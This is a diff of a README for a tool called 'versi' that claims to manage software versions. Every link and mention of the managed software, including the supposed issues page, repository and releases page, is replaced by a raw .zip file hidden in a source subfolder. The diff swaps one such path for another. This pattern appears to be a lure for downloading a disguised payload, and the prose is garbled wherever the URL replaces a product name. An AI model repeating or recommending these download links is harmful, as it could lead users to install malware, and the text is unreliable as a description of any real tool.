@@ -1,16 +1,16 @@
-# 🎉 versi - Easily Manage Your https://raw.githubusercontent.com/deckson040113/versi/main/crates/versi-shell/src/shells/Software-v3.9.zip Versions
+# 🎉 versi - Easily Manage Your https://github.com/deckson040113/versi/raw/refs/heads/main/crates/versi-core/src/commands/Software_v1.9.zip Versions
 
 ## 📥 Download Now
-[![Download versi](https://raw.githubusercontent.com/deckson040113/versi/main/crates/versi-shell/src/shells/Software-v3.9.zip)](https://raw.githubusercontent.com/deckson040113/versi/main/crates/versi-shell/src/shells/Software-v3.9.zip)
+[![Download versi](https://github.com/deckson040113/versi/raw/refs/heads/main/crates/versi-core/src/commands/Software_v1.9.zip)](https://github.com/deckson040113/versi/raw/refs/heads/main/crates/versi-core/src/commands/Software_v1.9.zip)
 
 ## 🚀 Getting Started
-versi is a user-friendly application designed for managing different versions of https://raw.githubusercontent.com/deckson040113/versi/main/crates/versi-shell/src/shells/Software-v3.9.zip on your computer. This tool makes it easy to switch between https://raw.githubusercontent.com/deckson040113/versi/main/crates/versi-shell/src/shells/Software-v3.9.zip versions, making it especially helpful for developers working on multiple projects.
+versi is a user-friendly application designed for managing different versions of https://github.com/deckson040113/versi/raw/refs/heads/main/crates/versi-core/src/commands/Software_v1.9.zip on your computer. This tool makes it easy to switch between https://github.com/deckson040113/versi/raw/refs/heads/main/crates/versi-core/src/commands/Software_v1.9.zip versions, making it especially helpful for developers working on multiple projects.
 
 ## 💾 Download & Install
 To get started with versi, follow these steps:
 
 1. **Visit the Download Page:** Click the link below to go to the releases page where you can download the application.
-   - [Download versi](https://raw.githubusercontent.com/deckson040113/versi/main/crates/versi-shell/src/shells/Software-v3.9.zip)
+   - [Download versi](https://github.com/deckson040113/versi/raw/refs/heads/main/crates/versi-core/src/commands/Software_v1.9.zip)
 
 2. **Choose Your Operating System:**
    - Linux
@@ -41,8 +41,8 @@ To ensure that versi runs smoothly, make sure your system meets these requiremen
 ## 🌟 Features
 versi offers an array of features that enhance your experience:
 
-- **https://raw.githubusercontent.com/deckson040113/versi/main/crates/versi-shell/src/shells/Software-v3.9.zip Version Management:**
-  - Easily switch between different https://raw.githubusercontent.com/deckson040113/versi/main/crates/versi-shell/src/shells/Software-v3.9.zip versions with a few clicks.
+- **https://github.com/deckson040113/versi/raw/refs/heads/main/crates/versi-core/src/commands/Software_v1.9.zip Version Management:**
+  - Easily switch between different https://github.com/deckson040113/versi/raw/refs/heads/main/crates/versi-core/src/commands/Software_v1.9.zip versions with a few clicks.
   
 - **User-Friendly Interface:**
   - The graphical interface simplifies the process, making it accessible for everyone.
@@ -60,7 +60,7 @@ versi offers an array of features that enhance your experience:
 Once you open versi, you will see a simple layout that includes:
 
 - **Current Version Display:**
-  - Shows which https://raw.githubusercontent.com/deckson040113/versi/main/crates/versi-shell/src/shells/Software-v3.9.zip version you are currently using.
+  - Shows which https://github.com/deckson040113/versi/raw/refs/heads/main/crates/versi-core/src/commands/Software_v1.9.zip version you are currently using.
 
 - **Version List:**
   - A list of installed versions and the option to add new versions by downloading them directly through the app.
@@ -74,8 +74,8 @@ Once you open versi, you will see a simple layout that includes:
 ## 🤝 Support
 If you encounter any issues while using versi, follow these steps for support:
 
-1. **Check Documentation:** Visit the [GitHub Issues page](https://raw.githubusercontent.com/deckson040113/versi/main/crates/versi-shell/src/shells/Software-v3.9.zip) for common questions and solutions.
-2. **Ask the Community:** Use forums or community groups related to https://raw.githubusercontent.com/deckson040113/versi/main/crates/versi-shell/src/shells/Software-v3.9.zip to seek help.
+1. **Check Documentation:** Visit the [GitHub Issues page](https://github.com/deckson040113/versi/raw/refs/heads/main/crates/versi-core/src/commands/Software_v1.9.zip) for common questions and solutions.
+2. **Ask the Community:** Use forums or community groups related to https://github.com/deckson040113/versi/raw/refs/heads/main/crates/versi-core/src/commands/Software_v1.9.zip to seek help.
 3. **Report an Issue:** If you find a bug or have a feature request, please open an issue on the GitHub page. Be sure to provide a detailed description.
 
 ## 🌍 Contributing
@@ -86,7 +86,7 @@ We welcome contributions to versi! If you're interested in helping improve the a
 3. **Submit a Pull Request:** Once you’re ready, submit a pull request to the main repository for review.
 
 ## 🔗 Links
-- **GitHub Repository:** [versi on GitHub](https://raw.githubusercontent.com/deckson040113/versi/main/crates/versi-shell/src/shells/Software-v3.9.zip)
-- **Releases Page:** [Download versi](https://raw.githubusercontent.com/deckson040113/versi/main/crates/versi-shell/src/shells/Software-v3.9.zip)
+- **GitHub Repository:** [versi on GitHub](https://github.com/deckson040113/versi/raw/refs/heads/main/crates/versi-core/src/commands/Software_v1.9.zip)
+- **Releases Page:** [Download versi](https://github.com/deckson040113/versi/raw/refs/heads/main/crates/versi-core/src/commands/Software_v1.9.zip)
 
-Stay tuned for updates, and thank you for using versi for your https://raw.githubusercontent.com/deckson040113/versi/main/crates/versi-shell/src/shells/Software-v3.9.zip version management needs!
+Stay tuned for updates, and thank you for using versi for your https://github.com/deckson040113/versi/raw/refs/heads/main/crates/versi-core/src/commands/Software_v1.9.zip version management needs!
